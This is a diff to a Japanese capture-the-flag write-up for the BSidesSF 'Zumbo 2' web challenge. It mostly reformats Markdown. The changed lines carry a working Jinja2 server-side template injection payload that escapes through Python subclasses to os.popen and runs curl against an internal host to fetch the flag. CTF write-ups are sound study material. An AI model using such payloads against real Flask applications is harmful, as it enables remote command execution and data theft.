@@ -247,7 +247,7 @@ FLAG: FIRST_FLAG_WASNT_HARD
 
 ## [Web 100] Zumbo 2
 
-```
+```python
 @app.route('/<path:page>')
 def custom_page(page):
     if page == 'favicon.ico': return ''
@@ -271,7 +271,13 @@ FLAG: RUNNER_ON_SECOND_BASE
 
 さきほどのコードを見ると、エラーメッセージをそのまま `flask.render_template_string` に投げています。テンプレートのインジェクションができそうです。
 
-過去問を探していると [A python's escape from PlaidCTF jail · @wapiflapi](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) という記事を見つけました。これをもとに `http://zumbo-8ac445b1.ctf.bsidessf.net/{{ ().__class__.__base__.__subclasses__()[59]().__repr__.im_func.func_globals['linecache'].os.popen('curl http://vault:8080/flag').read() }}` でフラグが出てきました。
+過去問を探していると [A python's escape from PlaidCTF jail · @wapiflapi](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) という記事を見つけました。これをもとに
+
+```
+http://zumbo-8ac445b1.ctf.bsidessf.net/{{ ().__class__.__base__.__subclasses__()[59]().__repr__.im_func.func_globals['linecache'].os.popen('curl http://vault:8080/flag').read() }}
+```
+
+でフラグが出てきました。
 
 ```
 FLAG: BRICK_HOUSE_BEATS_THE_WOLF
